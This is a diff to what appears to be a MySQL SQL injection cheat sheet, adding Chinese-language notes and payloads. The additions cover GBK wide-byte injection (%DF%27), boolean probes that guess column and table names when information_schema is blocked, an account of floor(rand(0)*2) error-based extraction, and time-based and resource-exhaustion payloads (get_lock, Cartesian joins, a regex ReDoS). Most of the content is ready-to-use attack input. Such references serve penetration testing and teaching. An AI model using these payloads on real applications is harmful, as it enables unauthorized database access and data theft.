@@ -42,7 +42,20 @@
 /*! MYSQL Special SQL */
 /*!32302 10*/ Comment for MYSQL version 3.23.02
 ```
+## 宽字节注入
 
+```
+在使用PHP连接MySQL的时候，当设置“set character_set_client = gbk”时会导致一个编码转换的问题，也就是我们熟悉的宽字节注入，当存在宽字节注入的时候，注入参数里带入％ DF％27，即可把 \（％5C）吃掉。 注入的语句必须以or为连接符，因为注入的宽字节字段必然为假。
+```
+
+## 无权读取information_schema库/拒绝order，union语句
+* 猜列名： ```1' and user is not null--+```
+* 猜当前表表名： ```1' and table.user is not null--+```
+* 猜库里其它表： ```1' and (select count() from table)>0--+```
+* 列表对应关系： ```1' and users.user is not null--+```
+* 猜字段内容： ```1' and user='admin / 
+                1' or user like '%a%
+             ```
 
 ## MYSQL Union Based
 
@@ -180,12 +193,13 @@ MariaDB [dummydb]> select author_id,title from posts where author_id=-1 union se
 
 ## MYSQL Error Based
 
-### MYSQL Error Based - Basic
-
 ```
     group by 在分组时会执行取记录，插记录到虚表这两个操作，当key存在时，会将count(*)直接更新。floor(rand(0)*2) 这个表达式的结果为011011。取记录时会执行此表达式一次，当key不存在时会重新计算此表达式。
     在插入第一条记录时，表达式已经执行了两次一次是在取记录，第二次是在插第一条记录时，当写入第二条记录时会再次执行一次表达式，此时表达式值为1（第三次），存在此key，所以只更新。写入第三条记录时，表达式值为0，key不存在，所以插入时重新计算表达式，结果为1，然后1这个主键已存在于虚拟表中，而新计算的值也为1（主键值必须唯一），所以产生了主键冲突的错误。
 ```
+
+### MYSQL Error Based - Basic
+
 
 Works with `MySQL >= 4.1`
 
@@ -289,7 +303,7 @@ AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 
 ### MYSQL Blind with LIKE
 
-['_'](https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing
+['_'] (https://www.w3resource.com/sql/wildcards-like-operator/wildcards-underscore.php) acts like the regex character '.', use it to speed up your blind testing
 
 ```sql
 SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
@@ -305,6 +319,9 @@ The following SQL codes will delay the output from MySQL.
 AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))  //SHA1
 RLIKE SLEEP([SLEEPTIME])
 OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
+get_lock('aa',5)  //必须提供长连接，在Apache+php的环境中需要使用mysql_pconnect()连接数据库
+SELECT count(*) FROM information_schema.columns A, information_schema.columns B; //笛卡尔积
+select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b'); // 正则匹配在匹配较长且自由度较高的字符串时，会造成较大的计算量。
 ```
 
 ### Using SLEEP in a subselect
